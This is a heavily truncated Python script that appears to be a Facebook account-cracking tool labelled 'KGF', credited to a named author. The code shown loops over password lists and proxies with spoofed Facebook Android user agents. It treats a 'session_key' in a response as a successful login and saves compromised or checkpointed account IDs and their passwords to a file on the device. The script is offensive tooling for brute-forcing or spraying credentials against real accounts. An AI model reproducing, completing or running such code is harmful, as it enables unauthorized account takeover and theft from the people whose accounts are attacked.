...
88  Yb  YboodP 88     
\033[1;37;1m-----------------------------------------------
\t      \033[1;37m\033[1;41m BEST-FRND : USMI GUL&ZAIN&AYAN\033[0m\033[1;37m
\033[1;37;1m-----------------------------------------------
\033[1;37;1m ▶ Author   : MUDASSAR ALI
\033[1;37;1m ▶ Facebook : MUDASSAR ALI
\033[1;37;1m ▶ Virson   : 2.9
\033[1;37;1m-----------------------------------------------""" )
def my_main():
    os.system("clear")
    print(logo)
  ...
  #  print("To stop process press CTRL c")
    ...
    def rana(user):
        ...
        for px in pp:
          ...
          #  print (ua)
            ...
            if 'session_key' in response.text:
                print('\r{}\033[1;92m [KGF-OK] {} {} {} {}'.format(G, url, fax, px, mys))
        ...
        #        print('\r{}\033[1;94m[2F-KING] {} {} {} {}'.format(G, url, fax, px, mys))
                ...
                #print(response.text)
                continue
        sys.stdout.write('\r {} [KGF] [{}|{}] [OK:{}] {}\r'.format(mys, str(loop), str(len(idx)), str(len(oku)) ,mys))
        sys.stdout.flush()
        loop += 1       
...
def rndm(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[1;37m [ KGF ] [%s] [\033[1;37mOK : %s ] \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                     ...
                     #   ua = 'Davik/2.1.0 (Linux; U; Android '+android_version+'.0.1; '+model+' Build/'+build+') Android;FBAN/Orca-Android;FBAV/233.0.0.16.158;FBPN/com.facebook.orca;FBLC/en_US;FBBV/172917909;FBCR/null;FBMF/vivo;FBBD/vivo;FBDV/vivo V3Max;FBSV/5.1.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920;FBLC/'+fblc+';FBRV/'+str(random.randint(000000000,999999999))+';FBCR/'+fbcr+';FBMF/'+fbmf+';FBBD/'+fbbd+';FBPN/'+fbpn+';FBDV/'+fbdv+';FBSV/'+fbsv+';FBOP/19;FBCA/'+fbca+';]'
                        ...
                        headers={
                                ...
                                'User-Agent': ua,
#"[FBAN/FB4A;FBAV/"+zomir+".0.0.6.119;FBBV/30034644;FBDM/{density=3.02,width=720,height=1544};FBLC/en_US;FBCR/ZONG;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/"+cph+";FBSV/12;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
              ...
              #                          print('\r\r\x1b[38;5;208m [Checkpoint] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/KGF-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
